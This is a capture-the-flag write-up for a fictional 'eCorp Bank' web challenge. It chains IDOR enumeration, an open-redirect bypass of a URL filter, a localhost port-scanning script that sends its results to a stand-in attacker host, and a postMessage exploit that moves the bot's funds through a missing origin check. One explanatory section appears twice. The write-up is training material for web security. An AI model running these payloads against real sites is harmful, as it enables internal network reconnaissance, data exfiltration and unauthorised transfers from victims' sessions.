# E Corp Bank - GDGFA

***

## eCorp Bank — CTF Challenge Writeup

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/01.png" alt=""><figcaption></figcaption></figure>

### Key Vulnerabilities

1. **Insecure Direct Object Reference (IDOR):**
   * The `/api/userData?id=` endpoint has no authentication check, allowing any logged-in user to enumerate all user IDs and leak sensitive data including `account_id`, `balance`, `email`, and `username`.
   * By iterating `id=1` through `id=5`, the attacker discovers White Rose (`ACCT-0005`) — the admin bot.
2. **Open Redirect:**
   * The `/redirect?url=` endpoint performs no validation on the target URL, redirecting the visitor to any arbitrary external site.
3. **XS-Leak (Timing Side-Channel):**
   * Since the challenge is black-box, the internal port the bot runs on is unknown.
   * By executing `fetch("http://localhost:PORT/", {mode:"no-cors"})` from inside the bot's browser against a list of common ports, open ports respond slowly (\~300ms TCP handshake) while closed ports fail instantly (\~10ms TCP RST).

## Let's Hack.....

### You need to have more than $1000 in your bank account to obtain the Golden Card.

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/02.png" alt=""><figcaption></figcaption></figure>

***

### Attack Flow

#### Phase 1 — Recon via IDOR

```
GET /api/userData?id=1  →  Alice   ACCT-0001
GET /api/userData?id=2  →  Bob     ACCT-0002
GET /api/userData?id=3  →  Charlie ACCT-0003
GET /api/userData?id=4  →  Dana    ACCT-0004
GET /api/userData?id=5  →  White Rose  ACCT-0005  ← bot
```

**Goal:** Identify the bot's account ID (`ACCT-0005`).

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/03.png" alt=""><figcaption></figcaption></figure>

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/04.png" alt=""><figcaption></figcaption></figure>

***

#### Phase 2 — Open Redirect Bypass

The message form validates:

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/05.png" alt=""><figcaption></figcaption></figure>

```python
if not url_content.startswith(SITE_URL):
    error = "Security policy: URLs must start with {SITE_URL}"
```

Bypass using the open redirect endpoint:

```
https://95.111.240.84/redirect?url=https://ATTACKER_SERVER/expliot.html
```

This passes the `startswith` check but redirects the bot to the attacker's server.

***

#### Phase 3 — postMessage Exploit

After Look At Source Code , I Found js File&#x20;

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/06.png" alt=""><figcaption></figcaption></figure>

We Will see in Source Code transfer.js , let's look on it.

```javascript
// transfer.js Code : 

window.addEventListener('message', function (event) {
  var data = event.data;

  if (data && data.type === 'TRANSFER_REQUEST') {
    fetch('/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from_account: data.from_account,
        to_account:   data.to_account,
        amount:       data.amount
      })
    })
    .then(function (res) { return res.json(); })
    .then(function (result) {
      if (event.source) {
        event.source.postMessage({ type: 'TRANSFER_RESULT', result: result }, '*');
      }
    })
    .catch(function (err) {
      console.error('Transfer error:', err);
    });
  }
});

```

### Cross-Origin postMessage Injection

The vulnerability is the missing `event.origin` check.

The listener accepts messages from **any window on any domain** — there is zero validation of where the message came from:

```javascript
// VULNERABLE — no origin check
window.addEventListener('message', function (event) {

// SECURE — should be this
window.addEventListener('message', function (event) {
  if (event.origin !== "https://95.111.240.84") return;
```

***

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/07.png" alt=""><figcaption></figcaption></figure>

### Phase 4 — XS-Leak Port Discovery

### The Trick: Public URL vs localhost

When crafting the exploit, the first instinct is to use the **public URL**:

```javascript
// ❌ This will NOT work
const win = window.open("https://95.111.240.84/transfer");
```

This fails because the attacker's page is hosted on an **external server** — opening `https://95.111.240.84/transfer` via `window.open()` from a different origin means the browser blocks any cross-origin access to the opened window due to the **Same-Origin Policy**. The `postMessage` technically sends, but the transfer page at the public URL has no way to trust or process it in this context.

***

**Here's where the game was:**

The bot runs **inside the server**, meaning it has direct access to `localhost`. While a regular attacker's browser can never reach `localhost:8080`, the bot's browser can — because it lives on the same machine as the Flask app.

```javascript
// This works — but ONLY from the bot's browser
const win = window.open("http://localhost:8080/transfer");
```

So the exploit only works when executed **inside the bot's context**, not from the attacker's browser directly. That's exactly why the full chain was needed:

```
Attacker sends message → bot visits attacker page
→ bot's browser opens localhost:8080/transfer
→ postMessage fires in bot's authenticated session
→ transfer succeeds
```

The public URL was a dead end. `localhost` was the key — and only the bot had access to it.

***

## Now !!.. What Port The bot Work on it ??&#x20;

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/08.png" alt=""><figcaption></figcaption></figure>

### The Trick: Public URL vs localhost

When crafting the exploit, the first instinct is to use the **public URL**:

```javascript
// ❌ This will NOT work
const win = window.open("https://95.111.240.84/transfer");
```

This fails because the attacker's page is hosted on an **external server** — opening `https://95.111.240.84/transfer` via `window.open()` from a different origin means the browser blocks any cross-origin access to the opened window due to the **Same-Origin Policy**. The `postMessage` technically sends, but the transfer page at the public URL has no way to trust or process it in this context.

***

**Here's where the game was:**

The bot runs **inside the server**, meaning it has direct access to `localhost`. While a regular attacker's browser can never reach `localhost:8080`, the bot's browser can — because it lives on the same machine as the Flask app.

```javascript
// ✅ This works — but ONLY from the bot's browser
const win = window.open("http://localhost:8080/transfer");
```

So the exploit only works when executed **inside the bot's context**, not from the attacker's browser directly. That's exactly why the full chain was needed:

```
Attacker sends message → bot visits attacker page
→ bot's browser opens localhost:8080/transfer
→ postMessage fires in bot's authenticated session
→ transfer succeeds
```

The public URL was a dead end. `localhost` was the key — and only the bot had access to it.

The attacker hosts `recon.html` which runs inside the bot's browser:

```javascript
<!DOCTYPE html>
<html>
<body>
<script>
const PORTS = [3000, 4000, 5000, 8000, 8080, 8888, 9000];
const EXFIL = "https://webhook.com/leak";

function probePort(port) {
  return new Promise(resolve => {
    const start = Date.now();
    fetch(`http://localhost:${port}/`, {
      mode: "no-cors",
      cache: "no-store"
    })
    .then(() => {
      resolve({ port, open: true, time: Date.now() - start });
    })
    .catch(() => {
      const time = Date.now() - start;
      resolve({ port, open: time > 50, time });
    });
  });
}

async function run() {
  const results = [];

  const probes = await Promise.all(PORTS.map(probePort));

  for (const r of probes) {
    results.push(r);
  }

  const data = encodeURIComponent(JSON.stringify(results));
  new Image().src = `${EXFIL}?d=${data}`;

  fetch(EXFIL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(results)
  }).catch(() => {});
}

run();
</script>
</body>
</html>
```

#### What is this Code Do ?&#x20;

In short, this code performs **client-side port scanning on the victim’s localhost and sends the results to an external server**.

How it works:

1. **Defines a list of ports to check**

```javascript
const PORTS = [3000, 4000, 5000, 8000, 8080, 8888, 9000];
```

These are common ports used by development servers, APIs, Docker services, and admin panels.

2. **Probes each localhost port using fetch**

```javascript
fetch(`http://localhost:${port}/`, {
  mode: "no-cors",
  cache: "no-store"
})
```

If the victim loads the page, their browser attempts to connect to services running on their own machine such as:

* [http://localhost:3000](http://localhost:3000/)
* [http://localhost:8080](http://localhost:8080/)
* etc.

3. **Determines whether a port is open using timing**\
   The script measures how long the request takes.

* If the error happens very quickly → the port is likely **closed**.
* If it takes longer → the port is likely **open**.

This logic appears here:

```javascript
resolve({ port, open: time > 50, time });
```

4. **Collects all scan results**\
   It runs all probes in parallel using:

```javascript
Promise.all(PORTS.map(probePort))
```

The result might look like:

```json
[
  {"port":3000,"open":true},
  {"port":4000,"open":false},
  {"port":8080,"open":true}
]
```

5. **Exfiltrates the data to an attacker-controlled server**\
   The results are sent to:

```
https://my_recon_web_server.com/leak
```

Two methods are used:

**Image request (GET exfiltration)**

```javascript
new Image().src = `${EXFIL}?d=${data}`;
```

**POST request**

```javascript
fetch(EXFIL, {
  method: "POST",
  headers: {"Content-Type":"application/json"},
  body: JSON.stringify(results)
})
```

Timing results exfiltrated to attacker server:

```
port 3000: closed  (8ms)
port 4000: closed  (7ms)
port 5000: closed  (9ms)
port 8000: closed  (6ms)
port 8080: OPEN    (13ms)  ← likely open!
port 8888: closed  (8ms)
port 9000: closed  (7ms)
```

**Goal:** Discover the internal port is `8080`.

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/09.png" alt=""><figcaption></figcaption></figure>

## Get The Flag<br>

**What this means in practice:**

An attacker can open this page from their own domain using `window.open()`, then send a crafted message pretending to be a legitimate transfer request. The page will blindly execute the transfer using the **victim's authenticated session** (cookies are sent automatically with the `fetch` call since it's same-origin).

```javascript
// Attacker page — completely different domain

<html>
<body>
<h1>Exploit POC @everythingBlackkk</h1>
<script>
  const win = window.open("http://localhost:8080/transfer");

  setTimeout(() => {
    win.postMessage({
      type: "TRANSFER_REQUEST",
      from_account: "ACCT-0005",
      to_account: "ACCT-217613",
      amount: 1000
    }, "*");
  }, 5000);
</script>
</body>
</html>
```

**The second `"*"` on the response is also a problem:**

```javascript
event.source.postMessage({ type: 'TRANSFER_RESULT', result: result }, '*');
```

This leaks the transfer result back to any origin — confirming whether the attack succeeded.

**In short:** No origin validation = any website can trigger transfers on behalf of any logged-in user.

#### Now!!!!

The bot opens the transfer page, the postMessage listener fires with no origin check, and `/api/transfer` is called using the bot's authenticated session — transferring $1000 to the attacker.

***

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/10.png" alt=""><figcaption></figcaption></figure>

#### Phase 5 — Flag Retrieval

With balance now ≥ $1000, the attacker activates the gold card:

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/11.png" alt=""><figcaption></figcaption></figure>

#### The Flag

```
gdg{0x_real_leak_veryG00d_Chall_0xblack_id0r}
```

***

## The Flow Again...

### Stage 1 — Recon via IDOR to find White Rose's account ID.

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/12.png" alt=""><figcaption></figcaption></figure>

### Stage 2 — Discover the open redirect and craft a URL that passes the startswith(SITE\_URL) filter but sends the bot to your server.

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/13.png" alt=""><figcaption></figcaption></figure>

### Stage 3 — XS-Leak port scan runs inside the bot's browser to find the internal port, then exfiltrates the result to your server.

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/14.png" alt=""><figcaption></figcaption></figure>

### Stage 4 — Final exploit using postMessage to trigger the transfer, then activate the gold card for the flag.

<figure><img src="./images/articles/ctf-e-corp-bank-gdgfa/15.png" alt=""><figcaption></figcaption></figure>

***

### Thank you all! I hope you enjoyed the article. If you have any questions, I’m here to help. 

Remember My name : everythingBlackkk

Made by ❤

Github : <https://github.com/everythingBlackkk>

Linkedin : [www.linkedin.com/in/everythingblackkk](http://www.linkedin.com/in/everythingblackkk)

X : <https://x.com/0xblackkk>

Youtube : <https://www.youtube.com/@everythingBlackkk>
